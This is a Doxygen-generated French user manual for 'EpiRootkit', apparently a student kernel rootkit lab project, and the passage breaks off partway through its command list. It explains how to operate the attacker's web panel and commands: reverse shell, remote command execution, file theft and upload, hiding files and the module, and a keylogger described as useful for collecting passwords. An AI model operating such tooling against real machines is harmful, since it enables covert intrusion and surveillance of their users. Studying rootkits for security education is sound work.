<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: Utilisation</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">Par STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('d9/dc4/md_pages_2fr_204__usage.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div><div class="header">
  <div class="headertitle"><div class="title">Utilisation</div></div>
</div><!--header-->
<div class="contents">
<div class="toc"><h3>Table of Contents</h3>
<ul><li class="level1"><a href="#autotoc_md23">üåê Interface Web</a><ul><li class="level2"><a href="#connexion">1. Connexion</a></li>
<li class="level2"><a href="#dashboard">2. Dashboard</a><ul><li class="level3"><a href="#autotoc_md24">‚úÖ Connexion</a></li>
<li class="level3"><a href="#autotoc_md25">üõ† Actions</a></li>
<li class="level3"><a href="#autotoc_md26">üñ• Syst√®me</a></li>
<li class="level3"><a href="#reverse-shell">üíª Reverse shell</a></li>
<li class="level3"><a href="#autotoc_md27">üíæ Disque</a></li>
<li class="level3"><a href="#autotoc_md28">üìä Ressources</a></li>
</ul>
</li>
<li class="level2"><a href="#terminal">3. Terminal</a><ul><li class="level3"><a href="#autotoc_md29">üñ•Ô∏è Interface</a></li>
<li class="level3"><a href="#autotoc_md30">üìÑ R√©sultats</a></li>
<li class="level3"><a href="#autotoc_md31">üïò Historique</a></li>
</ul>
</li>
<li class="level2"><a href="#autotoc_md32">4. Explorer</a><ul><li class="level3"><a href="#autotoc_md33">Victim&#39;s File Explorer</a></li>
<li class="level3"><a href="#autotoc_md34">File Upload</a></li>
<li class="level3"><a href="#autotoc_md35">Hidden dirs/files</a></li>
</ul>
</li>
<li class="level2"><a href="#keylogger">5. Keylogger</a><ul><li class="level3"><a href="#autotoc_md36">‚å®Ô∏è Frappes</a></li>
<li class="level3"><a href="#autotoc_md37">üîç Recherche</a></li>
<li class="level3"><a href="#autotoc_md38">üì¶ Exportation</a></li>
</ul>
</li>
</ul>
</li>
<li class="level1"><a href="#liste-des-commandes">üìú Liste des commandes</a></li>
</ul>
</div>
<div class="textblock"><p><a class="anchor" id="autotoc_md22"></a></p>
<p>L‚Äôutilisation du rootkit peut se faire soit en ligne de commande, soit via l‚Äôinterface graphique int√©gr√©e. Nous allons ici d√©crire les deux m√©thodes.</p>
<blockquote class="doxtable">
<p>&zwj;Pour tirer pleinement parti de cette section, veuillez d‚Äôabord vous assurer que la mise en place a √©t√© correctement effectu√©e, comme d√©crit pr√©c√©demment dans la section Mise en place. </p>
</blockquote>
<p>Dans un premier temps, nous expliquerons comment interagir avec l‚Äôinterface web. Ensuite, nous d√©taillerons l‚Äôensemble des commandes de base permettant d‚Äôinteragir √† distance avec le rootkit, accessibles aussi bien en ligne de commande (CLI) c√¥t√© attaquant qu‚Äô√† travers des boutons ou des champs de saisie dans l‚Äôinterface graphique.</p>
<h1><a class="anchor" id="autotoc_md23"></a>
üåê Interface Web</h1>
<blockquote class="doxtable">
<p>&zwj;<b>Remarque¬†:</b> L‚Äôinterface web fonctionne g√©n√©ralement de mani√®re fiable. Toutefois, des performances insuffisantes sur la machine d‚Äôattaque peuvent entra√Æner des dysfonctionnements, notamment lors de la gestion de nombreuses requ√™tes r√©seau ou d‚Äôop√©rations co√ªteuses (transfert de fichiers, ex√©cution de commandes complexes, etc.). Cela peut se traduire par des affichages incorrects ou des erreurs lors de l‚Äôutilisation de certaines fonctionnalit√©s. Si cela arrive, la meilleure solution est toujours de red√©marrer le serveur web. Ainsi, avant de signaler un probl√®me, assurez-vous que votre machine dispose de ressources suffisantes et relisez ce paragraphe afin d'√™tre certain que vous l'avez bien lu et pris en consid√©ration. Merci. </p>
</blockquote>
<h2><a class="anchor" id="connexion"></a>
1. Connexion</h2>
<p>Normalement, √† ce stade, vous devriez avoir les deux machines virtuelles ouvertes, avec le serveur Python en cours d‚Äôex√©cution. Si vous vous rendez sur l'interface web de l'attaquant (<a href="http://192.168.100.2:5000/">http://192.168.100.2:5000/</a>), vous devriez voir l'interface d'accueil du rootkit. Si le rootkit n'est pas encore connect√©, vous aurez un √©cran similaire √† celui-ci :</p>
<p> 
<figure style="text-align: center;">
  <img 
    src="../../../img/disconnected.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's web ui with rootkit disconnected.
  </figcaption>
</figure>
</p>
<p>Lorsque le rootkit sera d√©tect√© puis connect√© au server TCP du backend, l'interface changera pour devenir :</p>
<p> 
<figure style="text-align: center;">
  <img 
    src="../../../img/connect.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's web ui with rootkit connected.
  </figcaption>
</figure>
</p>
<p>Cependant une authentification est n√©cessaire pour acc√©der √† l‚Äôensemble des fonctionnalit√©s et contr√¥ler la machine victime √† distance. Cliquez ensuite sur Authenticate et saisissez le mot de passe <code>evannounet</code>. Apr√®s quelques instants, le tableau de bord principal de l‚Äôapplication devrait s‚Äôafficher :</p>
<p> 
<figure style="text-align: center;">
  <img 
    src="../../../img/authent.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's web ui while authenticating.
  </figcaption>
</figure>
</p>
<blockquote class="doxtable">
<p>&zwj;Pour plus d‚Äôinformations techniques concernant la gestion du mot de passe, voir <a class="el" href="../../df/d99/password.html#gestion-du-mot-de-passe">Gestion du mot de passe</a>. </p>
</blockquote>
<h2><a class="anchor" id="dashboard"></a>
2. Dashboard</h2>
<p> 
<figure style="text-align: center;">
  <img 
    src="../../../img/dash.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's dashboard after authentication.
  </figcaption>
</figure>
</p>
<p>Une fois connect√© et authentifi√©, le tableau de bord principal (dashboard) s‚Äôaffiche. Il permet un aper√ßu global de l‚Äô√©tat de la machine cible, ainsi qu‚Äôun acc√®s rapide √† certaines fonctionnalit√©s du rootkit. Voici les diff√©rents √©l√©ments pr√©sents ci-dessous.</p>
<h3><a class="anchor" id="autotoc_md24"></a>
‚úÖ Connexion</h3>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">√âl√©ment   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Status</b>   </td><td class="markdownTableBodyLeft">Indique que le rootkit est bien connect√© √† la machine cible.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>IP</b>   </td><td class="markdownTableBodyLeft">Adresse IP locale de la machine cible (ici <code>192.168.100.3</code>).    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Port</b>   </td><td class="markdownTableBodyLeft">Port utilis√© pour la connexion (ici <code>4242</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Time</b>   </td><td class="markdownTableBodyLeft">Heure actuelle sur la machine victime.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Last Command</b>   </td><td class="markdownTableBodyLeft">Affiche la derni√®re commande envoy√©e √† la cible.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Avertissement VM</b>   </td><td class="markdownTableBodyLeft">Affiche un message d‚Äôalerte si le rootkit d√©tecte un environnement virtuel.   </td></tr>
</table>
</div><h3><a class="anchor" id="autotoc_md25"></a>
üõ† Actions</h3>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Action   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Disconnect</b>   </td><td class="markdownTableBodyLeft">Permet de fermer proprement la connexion avec la cible.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Kill rootkit</b>   </td><td class="markdownTableBodyLeft">Met un terme √† l‚Äôex√©cution du rootkit sur la machine cible   </td></tr>
</table>
</div><h3><a class="anchor" id="autotoc_md26"></a>
üñ• Syst√®me</h3>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">√âl√©ment   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Architecture</b>   </td><td class="markdownTableBodyLeft">Architecture processeur de la machine (ici <code>x86_64</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>CPU Cores</b>   </td><td class="markdownTableBodyLeft">Nombre de c≈ìurs processeur d√©tect√©s (ici <code>1 c≈ìur</code>).    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>CPU Model</b>   </td><td class="markdownTableBodyLeft">Nom du processeur ou de l‚Äô√©mulateur utilis√© (ici <code>QEMU Virtual CPU</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Hostname</b>   </td><td class="markdownTableBodyLeft">Nom d‚Äôh√¥te de la machine (ici <code>victim</code>).    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>RAM</b>   </td><td class="markdownTableBodyLeft">Quantit√© totale de RAM disponible (ici <code>3889 Mo</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Version kernel</b>   </td><td class="markdownTableBodyLeft">Version du noyau Linux (ici <code>6.8.0-60-generic</code>).    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Version OS</b>   </td><td class="markdownTableBodyLeft">D√©tail de la distribution Linux et son build.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Virtual Env</b>   </td><td class="markdownTableBodyLeft">Indique si la machine semble tourner dans une VM (ici <code>true</code>).   </td></tr>
</table>
</div> <h3><a class="anchor" id="reverse-shell"></a>
üíª Reverse shell</h3>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">√âl√©ment   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Champ de port</b>   </td><td class="markdownTableBodyLeft">Permet de sp√©cifier un port sur lequel ouvrir un shell invers√©.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Launch Shell</b>   </td><td class="markdownTableBodyLeft">Lance le shell distant sur le port d√©fini.   </td></tr>
</table>
</div><blockquote class="doxtable">
<p>&zwj;<b>Attention :</b> Le bouton <em>Launch Shell</em> ouvre un terminal Kitty sur la machine d'attaque. Par cons√©quent, le serveur web <b>et</b> le navigateur doivent √™tre lanc√©s directement depuis la VM d'attaque pour que cette fonctionnalit√© fonctionne correctement (voir <a class="el" href="../../dd/dc9/md_pages_2fr_203__install.html#equivalents-attaque">√©quivalent des commandes</a>). De plus, le bouton d√©marre un shell Kitty et attend 2 secondes avant d'envoyer l'instruction de connexion √† la victime. Cependant, une machine h√¥te avec de faibles performances peut entrainer un d√©marrage trop long du shell, ce qui ne le rendra pas disponible √† temps pour recevoir la connexion du rootkit. Dans ce cas, il est recommand√© d'essayer de se d√©connecter-reconnecter du rootkit afin de r√©essayer (oui cela peut fonctionner) ou de lancer le shell manuellement en effectuant la proc√©dure d√©crite dans la section <a class="el" href="../../dd/de6/reverse.html#reverse-shell-reception">Reverse Shell</a>. </p>
</blockquote>
<h3><a class="anchor" id="autotoc_md27"></a>
üíæ Disque</h3>
<p>Un aper√ßu est fourni via la commande distante <code>df -h</code> ex√©cut√©e sur la machine virtuelle victime, indiquant les diff√©rentes partitions, leur taille, l‚Äôespace utilis√©/disponible et leur point de montage.</p>
<h3><a class="anchor" id="autotoc_md28"></a>
üìä Ressources</h3>
<p>Un petit graphique √† droite affiche en temps r√©el : </p><div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Ressource   </th><th class="markdownTableHeadLeft">Couleur d'affichage    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>CPU (%)</b>   </td><td class="markdownTableBodyLeft">Rouge    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>RAM (%)</b> n   </td><td class="markdownTableBodyLeft">Bleu   </td></tr>
</table>
</div><h2><a class="anchor" id="terminal"></a>
3. Terminal</h2>
<p>L‚Äôonglet <b>Terminal</b> permet de prendre le contr√¥le de la machine cible √† distance en ex√©cutant des commandes comme si l‚Äôon utilisait un terminal local.  
<figure style="text-align: center;">
  <img 
    src="../../../img/terminal.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's terminal interface for remote command execution.
  </figcaption>
</figure>
</p>
<h3><a class="anchor" id="autotoc_md29"></a>
üñ•Ô∏è Interface</h3>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">√âl√©ment   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Commande</b>   </td><td class="markdownTableBodyLeft">Saisissez ici une commande Unix/Linux classique (ex. : <code>ls -la</code>, <code>whoami</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Send</b>   </td><td class="markdownTableBodyLeft">Permet d‚Äôenvoyer la commande √† la machine cible.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Mode TCP</b>   </td><td class="markdownTableBodyLeft">Connexion directe via TCP. Timeout de 5 s. c√¥t√© rootkit pour √©viter les blocages (ex. : <code>ping</code>).    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>Mode DNS</b>   </td><td class="markdownTableBodyLeft">Commande via DNS. Timeout de 30 s.   </td></tr>
</table>
</div><h3><a class="anchor" id="autotoc_md30"></a>
üìÑ R√©sultats</h3>
<div class="full_width_table"> Les r√©sultats de l'ex√©cution apparaissent dans deux blocs distincts : <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">√âl√©ment   </th><th class="markdownTableHeadLeft">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>stdout</b>   </td><td class="markdownTableBodyLeft">Contenu de la sortie standard de la commande.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyLeft"><b>stderr</b>   </td><td class="markdownTableBodyLeft">Contenu de la sortie d‚Äôerreur de la commande.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><b>Code de sortie</b>   </td><td class="markdownTableBodyLeft">Code de terminaison de la commande   </td></tr>
</table>
</div><h3><a class="anchor" id="autotoc_md31"></a>
üïò Historique</h3>
<p>En bas de l‚Äô√©cran, une section intitul√©e <em>Command history</em> permet de consulter les commandes pr√©c√©demment envoy√©es √† la machine cible. Chaque commande est accompagn√©e de son r√©sultat, affich√© dans un bloc repliable afin de pr√©server la lisibilit√© de l‚Äôinterface. Cette fonctionnalit√© facilite √† la fois le suivi des actions r√©alis√©es, le d√©bogage en cas de probl√®me, et la r√©utilisation rapide de commandes fr√©quentes.</p>
<h2><a class="anchor" id="autotoc_md32"></a>
4. Explorer</h2>
<p>L‚Äôonglet <b>Explorer</b> permet d‚Äôexplorer le syst√®me de fichiers de la machine victime, offrant une vue hi√©rarchique des r√©pertoires et des fichiers pr√©sents sur celle-ci.</p>
<p> 
<figure style="text-align: center;">
  <img 
    src="../../../img/explorer.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the file explorer interface in the attacker's web UI.
  </figcaption>
</figure>
</p>
<h3><a class="anchor" id="autotoc_md33"></a>
Victim's File Explorer</h3>
<p>La partie de gauche de l‚Äôinterface affiche la structure des r√©pertoires de la machine victime. Vous pouvez naviguer dans les dossiers en cliquant sur les noms des r√©pertoires. Les fichiers et sous-r√©pertoires sont list√©s avec leurs noms, dans un ordre alphab√©tique en commen√ßant par les r√©pertoires, suivis des fichiers. Les r√©pertoires sont indiqu√©s par une ic√¥ne de dossier, tandis que les fichiers sont repr√©sent√©s par une ic√¥ne de document. Lors du survol d'un fichier, deux ic√¥nes apparaissent √† droite de la barre de s√©lection :</p><ul>
<li><b>üì• T√©l√©charger</b> : Permet de t√©l√©charger le fichier s√©lectionn√© sur la machine attaquante.</li>
<li><b>‚ùå Supprimer</b> : Permet de supprimer le fichier s√©lectionn√© de la machine victime.</li>
</ul>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Le t√©l√©chargement se fait en deux √©tapes : d'abord le fichier est transf√©r√© de la machine victime vers le serveur web (machine) de l'attaquant. Ensuite, il est ensuite t√©l√©charg√© sur la machine attaquante via le navigateur. Une fois le fichier t√©l√©charg√©, son nom apparait dans la section <b>Downloaded Files</b>, o√π il peut √™tre t√©l√©charg√© √† nouveau via le navigateur ou supprim√©. </p>
</blockquote>
<h3><a class="anchor" id="autotoc_md34"></a>
File Upload</h3>
<p>La partie de droite de l‚Äôinterface permet de t√©l√©charger des fichiers depuis la machine attaquante vers la machine victime. Vous pouvez s√©lectionner un fichier √† partir de votre syst√®me local en cliquant sur le bouton <b>Browse</b>. Une fois le fichier s√©lectionn√©, le path de destination sur la machine victime est affich√© dans le champ de saisie. Vous pouvez alors modifier le nom du fichier directement dans le champ de saisie ou le path de destination (par d√©faut la position actuelle dans l'explorateur) en cliquant dessus, ce qui fera apparaitre un champ de saisie modifiable. Une fois le nom du fichier ou le path de destination modifi√©, vous pouvez cliquer sur le bouton <b>Upload</b> pour envoyer le fichier vers la machine victime.</p>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Il n'y a pas de contrainte de type de fichier, vous pouvez envoyer n'importe quel fichier, qu'il soit ex√©cutable ou non. Pour ce qui est de la taille maximum, celle-ci est th√©oriquement de 4TB (voir l'explication du <a class="el" href="../../d5/dc4/network.html#tcp-protocole">protocole utilis√©</a> pour plus de d√©tails). </p>
</blockquote>
<h3><a class="anchor" id="autotoc_md35"></a>
Hidden dirs/files</h3>
<p>La derni√®re partie de l'interface permet d'afficher les fichiers et dossiers masqu√©s par le rootkit (voir commande <code>hooks list_hide</code> dans la <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#liste-des-commandes">liste des commandes</a>). Les afficher ici permet d'avoir connaissance de leur existance malgr√© leur absence visuelle de l'explorateur de fichiers.</p>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Il est toujours possible de manipuler ces fichiers et dossier masqu√©s mais il faudra pour cela passer par le <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#terminal">Terminal</a>. </p>
</blockquote>
<h2><a class="anchor" id="keylogger"></a>
5. Keylogger</h2>
<p>L‚Äôonglet <b>Keylogger</b> permet de r√©cup√©rer les frappes clavier effectu√©es sur la machine victime. Cette fonctionnalit√© est particuli√®rement utile pour collecter des mots de passe, des requ√™tes tap√©es dans un navigateur, ou encore pour surveiller l‚Äôactivit√© de la victime.  
<figure style="text-align: center;">
  <img 
    src="../../../img/keylogger.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the keylogger interface in the attacker's web UI.
  </figcaption>
</figure>
</p>
<h3><a class="anchor" id="autotoc_md36"></a>
‚å®Ô∏è Frappes</h3>
<p>Une zone de texte centrale affiche le contenu captur√© par le module de keylogging sous forme brute, sans mise en forme, exactement tel qu‚Äôil est stock√© sur la machine cible. Le bouton <em>Fetch data</em> permet de r√©cup√©rer les nouvelles frappes enregistr√©es depuis le module rootkit. L‚Äô√©tat du module est repr√©sent√© par un <em>switch ON/OFF</em> : lorsqu‚Äôil est activ√©, toutes les frappes clavier sont enregistr√©es en temps r√©el ; lorsqu‚Äôil est d√©sactiv√©, aucune donn√©e n‚Äôest collect√©e.</p>
<h3><a class="anchor" id="autotoc_md37"></a>
üîç Recherche</h3>
<p>Un champ de recherche permet de filtrer dynamiquement les r√©sultats affich√©s. Deux modes sont disponibles : en mode <em>Normal</em>, la recherche s‚Äôeffectue en texte brut, tandis que le mode <em>RegEx</em> active la prise en charge des expressions r√©guli√®res, offrant ainsi des possibilit√©s de filtrage avanc√©es. Une fois les crit√®res saisis, le bouton <em>Search</em> permet d‚Äôappliquer le filtre sur les donn√©es visibles.</p>
<h3><a class="anchor" id="autotoc_md38"></a>
üì¶ Exportation</h3>
<p>Le bouton <em>Download as .txt</em> permet de t√©l√©charger l‚Äôensemble des frappes captur√©es sous forme d‚Äôun fichier <code>.txt</code> directement sur la machine attaquante.</p>
<h1><a class="anchor" id="liste-des-commandes"></a>
üìú Liste des commandes</h1>
<p>La liste des commandes d√©crites ci-dessous sont des commandes propres √† Epirootkit, qui peuvent √™tre saisies dans le terminal de la machine attaquante apr√®s s‚Äô√™tre connect√© au rootkit. Beaucoup de ces commandes sont √©galement accessibles de mani√®re indirecte via l‚Äôinterface web, que ce soit par des boutons ou des champs de saisie. Cela n'est cependant pas le cas de toutes les commandes, certaines √©tant r√©serv√©es √† un usage en ligne de commande (CLI) pour des raisons de s√©curit√© ou de complexit√© et c'est pour cette usage que nous les d√©crivons ici.</p>
<p>Voici la liste des commandes disponibles, regroup√©es par th√®me :</p>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">Th√®me   </th><th class="markdownTableHeadNone">Commandes    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Acc√®s   </td><td class="markdownTableBodyNone"><a href="#connect">connect</a> ‚îÇ <a href="#disconnect">disconnect</a> ‚îÇ <a href="#killcom">killcom</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Authentification   </td><td class="markdownTableBodyNone"><a href="#help">help</a> ‚îÇ <a href="#passwd">passwd</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Contr√¥le syst√®me   </td><td class="markdownTableBodyNone"><a href="#exec">exec</a> ‚îÇ <a href="#getshell">getshell</a> ‚îÇ <a href="#sysinfo">sysinfo</a> ‚îÇ <a href="#is_in_vm">is_in_vm</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Keylogger   </td><td class="markdownTableBodyNone"><a href="#klgon">klgon</a> ‚îÇ <a href="#klgoff">klgoff</a> ‚îÇ <a href="#klg">klg</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Masquage module   </td><td class="markdownTableBodyNone"><a href="#hide_module">hide_module</a> ‚îÇ <a href="#unhide_module">unhide_module</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Fichiers   </td><td class="markdownTableBodyNone"><a href="#get_file">get_file</a> ‚îÇ <a href="#upload">upload</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Diagnostic   </td><td class="markdownTableBodyNone"><a href="#ping">ping</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Chiffrement   </td><td class="markdownTableBodyNone"><a href="#cipher">cipher</a> ‚îÇ <a href="#uncipher">uncipher</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Hooks (g√©n√©ral)   </td><td class="markdownTableBodyNone"><a href="#hooks-help">hooks help</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Hooks : fichiers   </td><td class="markdownTableBodyNone"><a href="#hooks-hide">hooks hide</a> ‚îÇ <a href="#hooks-unhide">hooks unhide</a> ‚îÇ <a href="#hooks-list_hide">hooks list_hide</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Hooks : interdiction   </td><td class="markdownTableBodyNone"><a href="#hooks-forbid">hooks forbid</a> ‚îÇ <a href="#hooks-unforbid">hooks unforbid</a> ‚îÇ <a href="#hooks-list_forbid">hooks list_forbid</a>    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone">Hooks : modification   </td><td class="markdownTableBodyNone"><a href="#hooks-modify">hooks modify</a> ‚îÇ <a href="#hooks-unmodify">hooks unmodify</a> ‚îÇ <a href="#hooks-list_modify">hooks list_modify</a>    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone">Hooks : ports   </td><td class="markdownTableBodyNone"><a href="#hooks-add_port">hooks add_port</a> ‚îÇ <a href="#hooks-remove_port">hooks remove_port</a> ‚îÇ <a href="#hooks-list_port">hooks list_port</a>   </td></tr>
</table>
</div> <details  open="true">
<summary  id="help">
<b>1. üÜò help</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">help</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche un menu r√©capitulatif de toutes les commandes disponibles pour l'attaquant. Certaines commandes affich√©es sont optimis√©es pour l'interface Web.</p>
<p></p>
</details>
<details  open="true">
<summary  id="connect">
<b>2. üîå connect</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">connect [PASSWORD]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Permet d'authentifier l'attaquant pour acc√©der au rootkit √† distance.</p>
<p><b>Param√®tres</b></p><ul>
